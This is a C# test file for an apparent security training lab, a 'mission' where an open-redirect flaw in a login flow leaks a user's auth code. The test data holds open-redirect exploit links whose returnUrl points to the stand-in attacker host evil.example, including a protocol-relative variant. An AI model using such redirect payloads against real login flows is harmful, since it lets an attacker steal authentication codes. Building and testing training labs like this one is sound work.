using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;

namespace Trainer.Web.Tests;

public class OpenRedirectMissionTests(WebApplicationFactory<Program> factory) : MissionTestBase(factory, "open-redirect")
{
    [Theory]
    [InlineData("https://enterprise.local/api/missions/open-redirect/login/continue?returnUrl=https://evil.example/")]
    [InlineData("/api/missions/open-redirect/login/continue?returnUrl=//evil.example/x")]
    public async Task Exploit_delivers_rikers_code_to_the_attacker_inbox(string link)
    {
        Mission.Reset();
        var client = Client();

        var reply = await client.PostAsJsonAsync($"{Api}/support/messages", new { link });
        reply.EnsureSuccessStatusCode();

        var inbox = await client.GetFromJsonAsync<JsonElement[]>($"{Api}/attacker/inbox");
        Assert.Contains(inbox!, e => e.GetProperty("url").GetString()!.Contains(Flag));
    }

    [Fact]
    public async Task Riker_ignores_links_to_foreign_hosts()
    {
        Mission.Reset();
        var client = Client();

        await client.PostAsJsonAsync($"{Api}/support/messages", new { link = "https://evil.example/login" });

        Assert.Empty((await client.GetFromJsonAsync<JsonElement[]>($"{Api}/attacker/inbox"))!);
    }

    [Fact]
    public async Task Normal_login_redirects_locally_with_wesleys_own_code()
    {
        var response = await Client().GetAsync(Mission.DefaultRequest.Path);

        Assert.Equal(HttpStatusCode.Redirect, response.StatusCode);
        var location = response.Headers.Location!.ToString();
        Assert.StartsWith($"{Api}/app/home?code=", location);
        Assert.DoesNotContain(Flag, location);
    }

    [Fact]
    public async Task Anonymous_login_is_rejected()
    {
        Assert.Equal(HttpStatusCode.Unauthorized, (await Client(null).GetAsync($"{Api}/login/continue?returnUrl=/")).StatusCode);
    }

    [Fact]
    public async Task Reset_clears_the_inbox()
    {
        var client = Client();
        await client.PostAsJsonAsync($"{Api}/support/messages", new { link = "/api/missions/open-redirect/login/continue?returnUrl=https://evil.example/" });
        Mission.Reset();

        Assert.Empty((await client.GetFromJsonAsync<JsonElement[]>($"{Api}/attacker/inbox"))!);
    }
}
